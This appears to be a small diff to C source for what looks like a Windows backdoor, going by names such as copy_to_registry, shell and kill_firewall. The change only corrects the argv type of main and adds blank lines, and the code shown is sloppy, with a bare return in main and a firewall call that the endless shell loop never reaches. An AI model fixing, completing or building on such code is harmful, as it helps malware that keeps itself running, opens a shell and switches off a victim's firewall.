@@ -171,9 +171,10 @@ void copy_to_registry()
 
    /* execute the program */
 
-   int main(int argc, char *argv)
+   int main(int argc, char **argv)
 
    {
+	   
     while(1)
 
     shell();
@@ -184,6 +185,7 @@ void copy_to_registry()
     kill_firewall();
 
     return;
+	   
    }
 
 
